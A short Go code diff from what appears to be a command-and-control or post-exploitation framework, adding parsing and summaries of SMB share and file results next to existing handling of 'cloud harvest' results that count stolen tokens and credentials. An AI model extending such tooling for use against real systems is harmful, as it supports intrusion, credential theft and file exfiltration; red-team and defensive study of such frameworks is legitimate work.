@@ -86,6 +86,14 @@ func InterpretResult(taskType pb.TaskType, result *pb.TaskResult) string {
 			summary = fmt.Sprintf("socks_stop success=%v", r.Success)
 		}
 	case pb.TaskType_TASK_MODULE:
+		// Try SMB first (shares/files), then cloud harvest.
+		smb := &pb.SMBClientResult{}
+		if proto.Unmarshal(result.Data, smb) == nil && (smb.Action != "" || len(smb.Names) > 0 || len(smb.FileData) > 0) {
+			summary = fmt.Sprintf("smb %s host=%s share=%s names=%d bytes=%d",
+				smb.Action, smb.Host, smb.Share, len(smb.Names), len(smb.FileData))
+			actions = smb.NextSuggestedActions
+			break
+		}
 		r := &pb.CloudHarvestResult{}
 		if proto.Unmarshal(result.Data, r) == nil && (len(r.Tokens) > 0 || len(r.Credentials) > 0 || r.Metadata != "") {
 			summary = fmt.Sprintf("cloud_harvest provider=%s tokens=%d creds=%d", r.Provider, len(r.Tokens), len(r.Credentials))
